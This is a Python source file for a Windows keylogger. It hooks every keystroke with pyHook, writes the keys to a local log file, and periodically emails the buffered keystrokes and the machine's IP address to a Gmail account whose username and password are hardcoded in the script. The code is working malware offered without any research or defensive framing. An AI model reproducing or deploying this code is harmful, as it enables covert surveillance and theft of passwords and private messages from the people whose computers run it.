from __future__ import print_function
from utility.network_utility import get_own_ip, internet_on
from notification.email_service import EmailService
from notification.email_service import Message
import pyHook, pythoncom, sys
import datetime
import sys
import time
import urllib2
import json

file_log = r'C:\keylogging\keylog.txt'
f = open(file_log, 'r+')
last_sent = datetime.datetime.now()


def on_keyboard_event(event):
    # logging.basicConfig(filename=file_log, level=logging.DEBUG, format='%(message)s')
    f.write(chr(event.Ascii))
    print(chr(event.Ascii), end="")
    if get_permission_to_send() and internet_on():
        global last_sent
        ip = get_own_ip()
        f.seek(0)
        keystrokes = f.read()
        send_email(ip + '\n' + keystrokes)
        last_sent = datetime.datetime.now()
        f.seek(0)
        f.truncate()

    return True


def get_permission_to_send():
    current_time = datetime.datetime.now()
    delta = current_time - last_sent

    with open(file_log) as f:
        buffer_size = len(f.read())

    if delta.seconds > 500 or buffer_size > 500:
        return True


def send_email(body):
    username = "n1gh7dev@gmail.com"
    password = "testdev123"
    message = Message("n1gh7dev@gmail.com", "n1gh7dev@gmail.com", "logging", body)
    sender = EmailService()
    sender.send(message, username, password)


def init_logging():
    hooks_manager = pyHook.HookManager()
    hooks_manager.KeyDown = on_keyboard_event
    hooks_manager.HookKeyboard()
    pythoncom.PumpMessages()


if internet_on():
    try:
        send_email(get_own_ip())
    except:
        pass

init_logging()
